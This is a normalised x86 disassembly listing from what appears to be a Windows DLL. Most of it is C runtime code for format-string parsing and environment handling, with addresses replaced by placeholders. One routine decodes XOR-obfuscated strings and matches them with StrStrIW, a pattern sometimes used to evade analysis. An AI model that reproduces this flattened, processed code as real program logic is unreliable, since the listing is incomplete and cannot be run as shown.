push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10048590
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100485e5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
mov edx [ ecx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x4
sub_10048623
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_10054678
call sub_10012991
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_100491cb ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_10078ba9
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_10020a90
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_10078bd8
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_1002f215
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10039bca
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_10078bd8
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10078ba9
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_10028397
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_1007b3f0
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_10078ba9
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_10078ba9
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_10078ac0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_10039bca
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10078ba9
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_100491eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
call sub_10012991
mov [ eax ] 0x16
push 0x3d
push esi
call sub_10028cf2
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1007dcc2
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1007dc70
mov edi eax
pop ecx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_10028397
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1002462a
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10020a90
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_10020a90
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_10028397
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_1004834e
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_1004834e
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10078ac0
pop ecx
add eax 0x2
push eax
call sub_10025450
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10020a90
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_10078ac0
pop ecx
add eax 0x2
push eax
push edi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_10020a90
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_10012991
mov [ eax ] 0x2a
sub_1004942d
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10050f80
push 0xffffffff
push eax
call sub_100208e0
jmp r-xdata
pop ebp
retn 0x8
sub_10049460
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_1005e3c0
pop esi
pop ebp
retn 0x4
sub_10049495
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10017bc2
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10049510
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10049551
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10042d7c
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_100249b4
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10042d7c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10042d7c
push 0x1
mov edi eax
call sub_10042d7c
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10060de1
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_100495f0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp [ edi + 0xd58 ] 0x0
mov [ ebp - 0x2c ] eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
and eax 0xffffffc5
mov [ ebp - 0x2c ] eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff96
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ edi + 0xda0 ]
mov ebx [ StrStrIW@IAT ]
xor eax eax
mov [ ebp - 0x8 ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov edi edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffad
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x16 ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
nop
cmp [ esi + 0x14 ] 0x8
jb r-xdata
and [ ebp - 0x2c ] 0xffffffe4
call sub_10040260
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffea
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0xe ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
and [ ebp - 0x2c ] 0xfffffffc
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
and [ ebp - 0x2c ] 0xfffffff4
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
sub_1004976d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100633dc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1004978e
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004770a
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
